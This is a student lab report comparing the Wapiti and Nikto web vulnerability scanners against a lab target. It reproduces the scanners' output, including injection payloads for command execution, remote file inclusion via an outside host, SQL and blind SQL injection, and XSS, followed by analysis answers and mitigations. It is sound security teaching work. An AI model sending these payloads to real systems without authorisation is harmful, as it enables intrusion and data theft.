# Cyber1Tool < Syed Farabi  and Anthony
Wapiti Nikto
March 2, 2025
CSCI 401

Lab Tasks
Tool Comparison
< Which tool detected more vulnerabilities? Why do you think that is? >


Wapiti Report




┌──(kali㉿attacker)-[~]
└─$ wapiti -u http://ethreal.com -o wapiti_report -f html
Unable to correctly determine your language settings. Using english as default.
Please check your locale settings for internationalization features.
===============================================================

     __    __            _ _   _ _____
    / / /\ \ \__ _ _ __ (_) |_(_)___ /
    \ \/  \/ / _` | '_ \| | __| | |_ \
     \  /\  / (_| | |_) | | |_| |___) |
      \/  \/ \__,_| .__/|_|\__|_|____/
                  |_|                 
Wapiti-3.0.4 (wapiti.sourceforge.io)
[*] Saving scan state, please wait...

 Note
========
This scan has been saved in the file /home/kali/.wapiti/scans/ethreal.com_folder_004401d7.db
[*] Wapiti found 15 URLs and forms during the scan
[*] Loading modules:
	 backup, blindsql, brute_login_form, buster, cookieflags, crlf, csp, csrf, exec, file, htaccess, http_headers, methods, nikto, permanentxss, redirect, shellshock, sql, ssrf, wapp, xss, xxe
Problem with local wapp database.
Downloading from the web...

[*] Launching module csp
CSP is not set

[*] Launching module http_headers
Checking X-Frame-Options :
X-Frame-Options is not set
Checking X-XSS-Protection :
X-XSS-Protection is not set
Checking X-Content-Type-Options :
X-Content-Type-Options is not set
Checking Strict-Transport-Security :
Strict-Transport-Security is not set

[*] Launching module cookieflags

[*] Launching module exec
---
Received a HTTP 500 error in http://ethreal.com/backend/login
Evil request:
    POST /backend/login HTTP/1.1
    Host: ethreal.com
    Referer: http://ethreal.com/backend/login
    Content-Type: application/x-www-form-urlencoded

    username=%2Fe%00&password=Letm3in_
---
---
Command execution in http://ethreal.com/contact via injection in the parameter subject
Evil request:
    POST /contact HTTP/1.1
    Host: ethreal.com
    Referer: http://ethreal.com/contact
    Content-Type: application/x-www-form-urlencoded

    name=default&email=wapiti2021%40mailinator.com&subject=a%3Benv%3B&message=Hi+there%21
---

[*] Launching module file
---
Received a HTTP 500 error in http://ethreal.com/backend/login
Evil request:
    POST /backend/login HTTP/1.1
    Host: ethreal.com
    Referer: http://ethreal.com/backend/login
    Content-Type: application/x-www-form-urlencoded

    username=https%3A%2F%2Fwapiti3.ovh%2Fe.php%00&password=Letm3in_
---
---
Received a HTTP 500 error in http://ethreal.com/contact
Evil request:
    POST /contact HTTP/1.1
    Host: ethreal.com
    Referer: http://ethreal.com/contact
    Content-Type: application/x-www-form-urlencoded

    name=default&email=wapiti2021%40mailinator.com&subject=https%3A%2F%2Fwapiti3.ovh%2Fe.php%00&message=Hi+there%21
---

[*] Launching module sql
---
Received a HTTP 500 error in http://ethreal.com/backend/login
Evil request:
    POST /backend/login HTTP/1.1
    Host: ethreal.com
    Referer: http://ethreal.com/backend/login
    Content-Type: application/x-www-form-urlencoded

    username=alice%C2%BF%27%22%28&password=Letm3in_
---

[*] Launching module xss
---
XSS vulnerability in http://ethreal.com/contact via injection in the parameter message
Evil request:
    POST /contact HTTP/1.1
    Host: ethreal.com
    Referer: http://ethreal.com/contact
    Content-Type: application/x-www-form-urlencoded

    name=default&email=wapiti2021%40mailinator.com&subject=default&message=%3CScRiPt%3Ealert%28%27wqepl1hwxq%27%29%3C%2FsCrIpT%3E
---

[*] Launching module ssrf
[*] Asking endpoint URL https://wapiti3.ovh/get_ssrf.php?id=dgpc4r for results, please wait...

[*] Launching module redirect

[*] Launching module blindsql
---
Received a HTTP 500 error in http://ethreal.com/backend/login
Evil request:
    POST /backend/login HTTP/1.1
    Host: ethreal.com
    Referer: http://ethreal.com/backend/login
    Content-Type: application/x-www-form-urlencoded

    username=%27+or+sleep%287%29%231&password=Letm3in_
---
---
Received a HTTP 500 error in http://ethreal.com/contact
Evil request:
    POST /contact HTTP/1.1
    Host: ethreal.com
    Referer: http://ethreal.com/contact
    Content-Type: application/x-www-form-urlencoded

    name=default&email=wapiti2021%40mailinator.com&subject=%27+and+%28SELECT+%2A+FROM+%5BODBC%3BDRIVER%3DSQL+SERVER%3BServer%3D1.1.1.1%3BDATABASE%3Dw%5D.a.p%29%00&message=Hi+there%21
---

[*] Launching module permanentxss

Report
------
A report has been generated in the file wapiti_report
Open wapiti_report/ethreal.com_03092025_1109.html with a browser to see this report.










Vulnerabilities	
< What types of vulnerabilities did Wapiti detect that Nikto missed?>





┌──(kali㉿attacker)-[~]
└─$ nikto -h https://ethreal.com -o "nikto.html" -Format htm
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          172.25.0.250
+ Target Hostname:    ethreal.com
+ Target Port:        443
---------------------------------------------------------------------------
+ SSL Info:        Subject:  /CN=localhost
                   Ciphers:  TLS_AES_256_GCM_SHA384
                   Issuer:   /CN=localhost
+ Start Time:         2025-03-09 11:21:37 (GMT0)
---------------------------------------------------------------------------
+ Server: nginx/1.27.4
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The site uses TLS and the Strict-Transport-Security HTTP header is not defined. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Hostname 'ethreal.com' does not match certificate's names: localhost. See: https://cwe.mitre.org/data/definitions/297.html
+ OPTIONS: Allowed HTTP Methods: OPTIONS, HEAD, GET .





REPORT ANALYSIS


Wapiti has detected 7 vulnerabilities in total.

Answer: The following defensive measures can help mitigate the vulnerabilities detected by Wapiti and Nikto:
SQL Injection (SQLi):


Use Prepared Statements/Parameterized Queries to prevent SQL injection by treating user inputs as data, not executable code.
Input Validation and Escaping: Validate and sanitize all user inputs to reject potentially harmful characters or commands.
Cross-Site Scripting (XSS):


Output Encoding: Encode user input before displaying it in the browser (e.g., using HTML entity encoding).
Content Security Policy (CSP): Set a strong CSP header to restrict the execution of untrusted JavaScript.
Sanitize Input: Ensure that input is sanitized and stripped of any potentially harmful code.
Command Execution:


Avoid directly executing user input within system commands. Use proper validation and sanitization before passing data to system commands.
Use web application firewalls (WAFs) to detect and block such attacks.
Server Misconfigurations:


HSTS: Implement HTTP Strict Transport Security (HSTS) to enforce HTTPS connections.
X-Frame-Options: Set the X-Frame-Options header to prevent clickjacking.
X-Content-Type-Options: Set this header to nosniff to prevent browsers from interpreting files as a different MIME type.
Limit HTTP Methods: Restrict unnecessary HTTP methods (like OPTIONS, TRACE) to reduce attack surface.
SSL/TLS Configuration:


Ensure Proper SSL Certificates: The SSL certificate must match the domain name to avoid man-in-the-middle (MITM) attacks.
Use Strong Ciphers: Disable weak ciphers and ensure only strong protocols like TLS 1.2 and 1.3 are used.
Perfect Forward Secrecy (PFS): Enable PFS to protect session keys even if the private key is compromised.
By implementing these defenses, you can significantly improve the security posture of your application and server.


Nikto found 5 vulnerabilities in total:



X-Frame-Options header is not set: This can lead to clickjacking attacks.


The X-Frame-Options header is missing, which can make the website vulnerable to clickjacking.
Strict-Transport-Security (HSTS) header is not set: This leaves the site vulnerable to man-in-the-middle (MITM) attacks, especially on users who might try to access the site via HTTP.


The site uses TLS, but it doesn't enforce HTTPS with the HSTS header.
X-Content-Type-Options header is not set: This could allow the browser to misinterpret the content type, possibly leading to cross-site scripting (XSS) or other issues.


The header is missing, which could allow the browser to attempt to interpret the content in unexpected ways.
Certificate Hostname Mismatch: The hostname 'ethreal.com' does not match the SSL certificate's common name (localhost), which can result in SSL/TLS trust issues.


The SSL certificate is issued for localhost but is being used for ethreal.com, causing a mismatch.
Allowed HTTP Methods: The server allows the following HTTP methods: OPTIONS, HEAD, and GET.


While not necessarily a vulnerability by itself, the presence of the OPTIONS method can sometimes expose the server to attacks, such as information leakage about the supported HTTP methods.
So, in summary, 5 vulnerabilities were found by Nikto.





























Intelligence Report: Analysis Questions
Which tool detected more vulnerabilities? Why do you think that is?
What types of vulnerabilities did Wapiti detect that Nikto missed?
What types of vulnerabilities did Nikto detect that Wapiti missed?
How do the scanning methodologies differ between Wapiti and Nikto?
What defensive measures could mitigate these vulnerabilities?



a) Which tool detected more vulnerabilities? Why do you think that is?
Answer: Wapiti detected more vulnerabilities than Nikto.
Reason: Wapiti and Nikto use different methods to detect vulnerabilities:
Wapiti is a web application scanner that focuses on dynamic testing and simulates attacks to find vulnerabilities like SQL injection, Cross-Site Scripting (XSS), command injection, etc. It tries to execute attacks on specific parts of the application, such as form fields and URLs, providing detailed information about how a vulnerability could be exploited.


Nikto, on the other hand, is a web server scanner that primarily focuses on finding configuration issues, outdated software, and other basic server-side problems like missing HTTP headers, SSL certificate issues, and some common web server misconfigurations.


Since Wapiti is focused on identifying more specific application-level vulnerabilities, it typically identifies a wider range of security issues compared to Nikto, which focuses more on server misconfigurations and other surface-level vulnerabilities.









b) What types of vulnerabilities did Wapiti detect that Nikto missed?
Answer: Wapiti detected vulnerabilities that Nikto missed, such as:
SQL Injection (SQLi): Wapiti detected SQL injection attacks through form fields (e.g., /backend/login).


Example: The evil request username=alice%C2%BF%27%22%28&password=Letm3in_ detected by Wapiti caused a HTTP 500 error due to SQL injection.


Cross-Site Scripting (XSS): Wapiti identified an XSS vulnerability on the /contact form via the message parameter.


Example: message=%3CScRiPt%3Ealert%28%27wqepl1hwxq%27%29%3C%2FsCrIpT%3E.


Command Execution: Wapiti also detected command execution via parameter injection in the /contact form.


Example: subject=a%3Benv%3B caused command execution in the application.


Blind SQL Injection: Detected an attempt at blind SQL injection via the login form (username=%27+or+sleep%287%29%231&password=Letm3in_).


These types of vulnerabilities (e.g., XSS, SQL injection, command injection) focus on attacking application logic, which Wapiti is designed to detect.












c) What types of vulnerabilities did Nikto detect that Wapiti missed?


Answer: Nikto detected vulnerabilities that Wapiti missed, such as:
SSL/TLS Configuration Issues: Nikto reported that the server was using SSL but had some issues related to the SSL/TLS certificate:


Hostname 'ethreal.com' did not match the certificate's common name localhost. This mismatch can cause trust issues.
The Strict-Transport-Security (HSTS) header was missing, which could prevent browsers from enforcing HTTPS on subsequent requests.
The X-Content-Type-Options header was not set, which could allow the browser to interpret the content inappropriately.
X-Frame-Options were not set, leaving the site vulnerable to clickjacking attacks.
Anti-clickjacking: Nikto pointed out the absence of the X-Frame-Options header, which prevents the site from being embedded in an <iframe>. Without it, attackers can use clickjacking to trick users into clicking something unintentionally.


HTTP Method Check: Nikto detected the allowed HTTP methods (OPTIONS, HEAD, and GET) on the server. It helps determine which methods are allowed, and unnecessary methods can be exploited for various attacks.


Nikto is better suited for detecting server-side configuration issues and SSL/TLS issues, whereas Wapiti focuses more on vulnerabilities in the web application's logic and code.








d) How do the scanning methodologies differ between Wapiti and Nikto?
Answer:
Wapiti uses a black-box testing methodology, meaning it focuses on interacting with the application as an attacker would. It simulates real-world attacks like SQL injection, XSS, and command execution, aiming to identify vulnerabilities in the web application's business logic and user input handling.


It attacks the application by submitting malicious data through URLs, form fields, and other input points. This testing method focuses on discovering dynamic vulnerabilities.
Nikto, on the other hand, is a server-scanning tool that focuses more on misconfigurations, outdated software, and weak server configurations. It checks for things like:


Missing HTTP headers.
Vulnerable versions of web server software.
Common server-side misconfigurations (e.g., permissions, directory listing).
Nikto performs a more surface-level scan, focusing on issues that might expose the server to attackers, but it doesn’t perform deep, application-level vulnerability assessments like Wapiti.

























e) What defensive measures could mitigate these vulnerabilities?




Answer: The following defensive measures can help mitigate the vulnerabilities detected by Wapiti and Nikto:
SQL Injection (SQLi):


Use Prepared Statements/Parameterized Queries to prevent SQL injection by treating user inputs as data, not executable code.
Input Validation and Escaping: Validate and sanitize all user inputs to reject potentially harmful characters or commands.
Cross-Site Scripting (XSS):


Output Encoding: Encode user input before displaying it in the browser (e.g., using HTML entity encoding).
Content Security Policy (CSP): Set a strong CSP header to restrict the execution of untrusted JavaScript.
Sanitize Input: Ensure that input is sanitized and stripped of any potentially harmful code.
Command Execution:


Avoid directly executing user input within system commands. Use proper validation and sanitization before passing data to system commands.
Use web application firewalls (WAFs) to detect and block such attacks.
Server Misconfigurations:


HSTS: Implement HTTP Strict Transport Security (HSTS) to enforce HTTPS connections.
X-Frame-Options: Set the X-Frame-Options header to prevent clickjacking.
X-Content-Type-Options: Set this header to nosniff to prevent browsers from interpreting files as a different MIME type.
Limit HTTP Methods: Restrict unnecessary HTTP methods (like OPTIONS, TRACE) to reduce attack surface.
SSL/TLS Configuration:


Ensure Proper SSL Certificates: The SSL certificate must match the domain name to avoid man-in-the-middle (MITM) attacks.
Use Strong Ciphers: Disable weak ciphers and ensure only strong protocols like TLS 1.2 and 1.3 are used.
Perfect Forward Secrecy (PFS): Enable PFS to protect session keys even if the private key is compromised.
By implementing these defenses, you can significantly improve the security posture of your application and server.



